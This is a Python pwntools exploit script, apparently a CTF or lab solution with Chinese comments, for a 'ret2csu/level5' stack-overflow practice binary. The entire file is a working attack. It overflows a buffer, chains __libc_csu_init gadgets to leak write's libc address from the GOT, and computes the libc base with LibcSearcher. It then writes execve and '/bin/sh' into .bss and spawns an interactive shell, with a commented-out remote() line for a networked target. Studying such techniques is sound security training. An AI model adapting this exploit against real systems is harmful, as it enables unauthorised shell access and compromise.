from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = 'debug'

pwn_dir = "/home/kali/Desktop/PWN/stack"
pwn_stack_type_dir = "ret2csu/level5"
elf_name = "{}/{}".format(pwn_dir, pwn_stack_type_dir)

elf = ELF(elf_name)
sh = process([elf_name])
# sh = remote('', )

# pop_rbx_rbp_r12_r13_r14_r15_ret
csu_pop = 0x40061A
# call [r12 + rbx*8]
csu_end = 0x400600

main_addr = elf.symbols['main']
write_got = elf.got['write']
write_plt = elf.plt['write']

print("main_plt=>", hex(main_addr))
print("write_got=>", hex(write_got))
print("write_got=>", hex(write_plt))

# 万能gadgets
def csu(rbx, rbp, r12, r13, r14, r15, ret_addr):
    payload = b'a' * 0x80 + b'b' * 8
    payload += p64(csu_pop) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_end)

    payload += b'a' * 0x38
    payload += p64(ret_addr)
    sh.sendline(payload)
    sleep(0.2)


sh.recvuntil(b'Hello, World\n')
# 获得write函数地址
# 此处是 write_got 而非 write_plt
csu(0, 1, write_got, 8, write_got, 1, main_addr)
write_addr = u64(sh.recv(8))
print("libc_write=>", hex(write_addr))

# 通过后12位偏移查询libc版本
# 若提供 libc 直接通过　GOT 与 PLT 的偏移计算其他函数在 libc 中的地址.(此时可不用 LibcSearcher )
libc = LibcSearcher('write', write_addr)
# libc基地址 = write地址 - write偏移
libc_base = write_addr - libc.dump('write')

print("libc_base=>", hex(libc_base))
#######################################################

read_got = elf.got['read']
execve_addr = libc_base + libc.dump('execve')
bss_addr = elf.bss()

print("execve_addr=>", hex(execve_addr))
print("bss_addr=>", hex(bss_addr))

sh.recvuntil(b'Hello, World\n')
# 向bss段写入execve地址与'/bin/sh'字符串
csu(0, 1, read_got, 16, bss_addr, 0, main_addr)
sh.send(p64(execve_addr) + b'/bin/sh\x00')

#######################################################

sh.recvuntil(b'Hello, World\n')
# 调用execve('/bin/sh\x00')
csu(0, 1, bss_addr, 0, 0, bss_addr + 8, main_addr)

sh.interactive()
